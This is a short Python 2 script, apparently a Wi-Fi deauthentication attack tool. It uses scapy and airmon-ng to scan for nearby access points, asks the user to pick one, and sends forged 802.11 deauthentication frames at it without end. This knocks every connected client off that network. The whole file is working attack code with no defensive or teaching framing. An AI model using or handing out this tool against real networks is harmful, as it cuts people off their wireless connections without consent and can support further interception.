from scapy.all import *
import subprocess, os, sys

global ap
ap = {}

def displayssid(dictofssid=None): 
	global ap
	os.system("clear")
	if dictofssid is not None:
		ap = dictofssid
	else:
		counter = 1
		for a, b in ap.iteritems(): 
			print str(counter)+'. '+str(a)+' : '+str(b)
			counter += 1
			
def grabssid(pkt): 
	if pkt.haslayer(Dot11): 
		if pkt.type == 0 and pkt.subtype == 8: 
			if pkt.addr2 not in ap.items(): 
				ap[pkt.info] = pkt.addr2
			displayssid()
			
def sniffall():
	inter = raw_input("Enter Interface to Use: ")
	if 'mon' not in inter: 
		try:
			print 'Attempting to put interface into monitor mode...'
			with open(os.devnull, 'wb') as devnull:
				som = subprocess.check_call(['airmon-ng', 'start',inter], stdout=devnull, stderr=subprocess.STDOUT)
			inter = 'mon0'
			print 'Success!'
		except: 
			pass
	try:
		sniff(iface=inter, prn=grabssid)
	except KeyboardInterrupt: 
		pass
	except: 
		print 'Unable to sniff on interface '+inter
		sys.exit(0)
	return inter
		
def deauthall(bssid, count=-1, client='FF:FF:FF:FF:FF:FF', inter=None): 
	pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
	anoth = None
	if client != 'FF:FF:FF:FF:FF:FF' : anoth = Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth()
	print '-------------------------------------------------------------------------'
	print 'Attacking, 1.21 gigawatts!'
	print '-------------------------------------------------------------------------'
	while count != 0: 
		try:
			for i in range(64): 
				send(pckt, verbose=False)
				if anoth is not None: 
					send(anoth, verbose=False)
			count -= 1
		except KeyboardInterrupt:
			break
	if inter is not None:
		closing(inter)
	closing()

def closing(inter=None):
	os.system('clear')
	print 'Thanks for using me, it was a great day for science!'
	if inter is not None:
		print 'Taking card out of monitor mode for you, gimme a sec...'
		with open(os.devnull, 'wb') as devnull:
			som = subprocess.check_call(['airmon-ng', 'stop', inter], stdout=devnull, stderr=subprocess.STDOUT)
	sys.exit(0)
	
if __name__ == "__main__": 
	inter = sniffall() 
	displayssid()
	try:
		choice = raw_input("What AP you want to attack: ")
	except KeyboardInterrupt:
		closing(inter) 
	print 'Using interface '+inter
	deauthall(ap.values()[int(choice)-1], inter=inter)
		
